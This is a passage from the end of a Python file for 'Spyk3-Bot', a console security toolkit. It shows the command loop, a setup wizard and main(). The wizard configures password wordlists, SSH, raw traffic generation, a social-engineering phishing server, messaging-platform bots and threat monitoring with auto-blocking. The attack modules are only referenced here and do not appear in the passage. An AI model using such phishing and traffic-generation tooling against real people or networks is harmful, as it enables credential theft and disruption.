            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        elif cmd == 'exit':
            self.running = False
            print(f"\n{Colors.WARNING}👋 Thank you for using Spyk3-Bot!{Colors.RESET}")
        else:
            result = self.handler.execute(command)
            if result['success']:
                output = result.get('output', '') or result.get('data', '')
                if isinstance(output, dict):
                    print(json.dumps(output, indent=2))
                else:
                    print(output)
                print(f"\n{Colors.SUCCESS}✅ Command executed ({result['execution_time']:.2f}s){Colors.RESET}")
            else:
                print(f"\n{Colors.ERROR}❌ Command failed: {result.get('output', 'Unknown error')}{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        self.check_dependencies()
        
        print(f"\n{Colors.PRIMARY}🔐 Crunch Wordlist Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        setup_crunch = input(f"{Colors.ORANGE}Configure crunch wordlist settings? (y/n): {Colors.RESET}").strip().lower()
        if setup_crunch == 'y':
            self.setup_crunch_config()
        
        print(f"\n{Colors.PRIMARY}🔌 SSH Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        setup_ssh = input(f"{Colors.ORANGE}Configure SSH settings? (y/n): {Colors.RESET}").strip().lower()
        if setup_ssh == 'y':
            self.setup_ssh_config()
        
        if self.traffic_gen.scapy_available and not self.traffic_gen.has_raw_socket_permission:
            print(f"\n{Colors.WARNING}⚠️  Raw socket permission required for advanced traffic types{Colors.RESET}")
            print(f"{Colors.WARNING}   Run with sudo/admin privileges for full functionality{Colors.RESET}")
        
        print(f"\n{Colors.PRIMARY}🚀 Traffic Generation Setup{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        setup_traffic = input(f"{Colors.ORANGE}Configure traffic generation settings? (y/n): {Colors.RESET}").strip().lower()
        if setup_traffic == 'y':
            self.setup_traffic_config()
        
        print(f"\n{Colors.PRIMARY}🎣 Social Engineering Setup{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        setup_social = input(f"{Colors.ORANGE}Configure social engineering settings? (y/n): {Colors.RESET}").strip().lower()
        if setup_social == 'y':
            self.setup_social_engineering()
        
        print(f"\n{Colors.PRIMARY}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        configure_bots = input(f"{Colors.ORANGE}Would you like to configure messaging platforms? (y/n): {Colors.RESET}").strip().lower()
        if configure_bots == 'y':
            print(f"\n{Colors.PRIMARY}Available Platforms:{Colors.RESET}")
            print(f"  1. Discord")
            print(f"  2. Telegram")
            print(f"  3. WhatsApp")
            print(f"  4. Signal")
            print(f"  5. Slack")
            print(f"  6. iMessage (macOS only)")
            print(f"  7. All")
            
            choice = input(f"{Colors.ORANGE}Select platforms to configure (comma-separated, e.g., 1,3,5): {Colors.RESET}").strip()
            
            if '1' in choice or '7' in choice:
                self.setup_discord()
            if '2' in choice or '7' in choice:
                self.setup_telegram()
            if '3' in choice or '7' in choice:
                self.setup_whatsapp()
            if '4' in choice or '7' in choice:
                self.setup_signal()
            if '5' in choice or '7' in choice:
                self.setup_slack()
            if '6' in choice or '7' in choice:
                self.setup_imessage()
        
        auto_monitor = input(f"\n{Colors.ORANGE}Start threat monitoring automatically? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            self.monitor.start_monitoring()
            print(f"{Colors.SUCCESS}✅ Threat monitoring started{Colors.RESET}")
        
        if self.monitor.auto_block:
            print(f"{Colors.SUCCESS}✅ Auto-block is enabled (threshold: {self.monitor.auto_block_threshold} alerts){Colors.RESET}")
        else:
            enable_auto_block = input(f"{Colors.ORANGE}Enable auto-blocking? (y/n): {Colors.RESET}").strip().lower()
            if enable_auto_block == 'y':
                self.monitor.auto_block = True
                try:
                    threshold = input(f"{Colors.ORANGE}Enter alert threshold for auto-block (default: 5): {Colors.RESET}").strip()
                    if threshold:
                        self.monitor.auto_block_threshold = int(threshold)
                    else:
                        self.monitor.auto_block_threshold = 5
                except:
                    self.monitor.auto_block_threshold = 5
                
                print(f"{Colors.SUCCESS}✅ Auto-block enabled (threshold: {self.monitor.auto_block_threshold} alerts){Colors.RESET}")
                
                if 'security' not in self.config:
                    self.config['security'] = {}
                self.config['security']['auto_block'] = True
                self.config['security']['auto_block_threshold'] = self.monitor.auto_block_threshold
                ConfigManager.save_config(self.config)
        
        print(f"\n{Colors.SUCCESS}✅ Tool ready! Session ID: {self.session_id}{Colors.RESET}")
        print(f"{Colors.SECONDARY}   Type 'help' for commands, 'crunch' for wordlist generation, 'ssh_list' for SSH servers.{Colors.RESET}")
        print(f"{Colors.PRIMARY}⏰ Try 'time', 'date', 'datetime', or 'history' for time-related commands.{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.ORANGE}{self.session_id}{Colors.PRIMARY}]{Colors.ORANGE} 🕷️> {Colors.RESET}"
                command = input(prompt).strip()
                self.process_command(command)
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {str(e)}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        self.monitor.stop_monitoring()
        self.whatsapp_bot.stop()
        self.signal_bot.stop()
        self.slack_bot.stop()
        self.imessage_bot.stop()
        self.ssh_manager.disconnect()
        self.traffic_gen.stop_generation()
        if self.handler.social_tools.phishing_server.running:
            self.handler.social_tools.stop_phishing_server()
        self.db.end_session(self.session_id)
        self.db.close()
        
        print(f"\n{Colors.SUCCESS}✅ Tool shutdown complete.{Colors.RESET}")
        print(f"{Colors.PRIMARY}📁 Logs saved to: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}🔌 SSH logs: {SSH_LOGS_DIR}{Colors.RESET}")
        print(f"{Colors.PRIMARY}🕷️  Nikto results: {NIKTO_RESULTS_DIR}{Colors.RESET}")
        print(f"{Colors.PRIMARY}🚀 Traffic logs: {TRAFFIC_LOGS_DIR}{Colors.RESET}")
        print(f"{Colors.PRIMARY}🔐 Crunch wordlists: {CRUNCH_OUTPUT_DIR}{Colors.RESET}")
        print(f"{Colors.PRIMARY}🎣 Phishing data: {PHISHING_DIR}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.PRIMARY}🕷️ Starting Spyk3-Bot (Cyberpunk Green/Orange Theme Edition) ...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7 or higher is required{Colors.RESET}")
            sys.exit(1)
        
        required_packages = ['paramiko', 'cryptography']
        missing_packages = []
        
        for package in required_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                missing_packages.append(package)
        
        if missing_packages:
            print(f"{Colors.WARNING}⚠️  Missing required packages: {', '.join(missing_packages)}{Colors.RESET}")
            print(f"{Colors.WARNING}   Install with: pip install {' '.join(missing_packages)}{Colors.RESET}")
            print(f"{Colors.WARNING}   Continuing with limited functionality...{Colors.RESET}")
        
        needs_admin = False
        if platform.system().lower() == 'linux':
            if os.geteuid() != 0:
                needs_admin = True
        elif platform.system().lower() == 'windows':
            import ctypes
            try:
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️  Warning: Running without admin/root privileges{Colors.RESET}")
            print(f"{Colors.WARNING}   Firewall operations (block_ip/unblock_ip) will not work{Colors.RESET}")
            print(f"{Colors.WARNING}   Advanced traffic generation (raw packets) will be limited{Colors.RESET}")
            print(f"{Colors.WARNING}   Run with sudo/administrator for full functionality{Colors.RESET}")
            time.sleep(2)
        
        app = Spyk3Bot()
        app.run()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {str(e)}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()